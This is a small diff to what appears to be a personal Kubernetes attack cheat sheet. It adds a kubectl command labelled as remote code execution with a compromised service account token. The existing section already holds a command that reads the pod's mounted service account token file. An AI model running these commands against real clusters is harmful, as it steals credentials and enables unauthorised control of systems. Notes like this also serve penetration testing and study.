@@ -38,13 +38,15 @@ _/ ___\ |  |  \ _/ __ \ \__  \ \   __\     /  ___/|  |  \ _/ __ \_/ __ \\   __\
 
 
 ------------------------------------------------------------------------------------------------------------------------------------
-                                          random commands i've run (inside container)
+                                         useful commands (misc.)
 ------------------------------------------------------------------------------------------------------------------------------------
 
 - curl localhost:8080
    - (from inside a nodeJS pod, we query the nodeJS server)
 - cat /var/run/secrets/kubernetes.io/serviceaccount/token
    - (view service account token!)
+- kubectl --insecure-skip-tls-verify -shttps://[IP]:PORT/ --token="[TOKEN]" -n kube-system get pods
+   - RCE with compromised SA token
   
 ------------------------------------------------------------------------------------------------------------------------------------
                                             ports
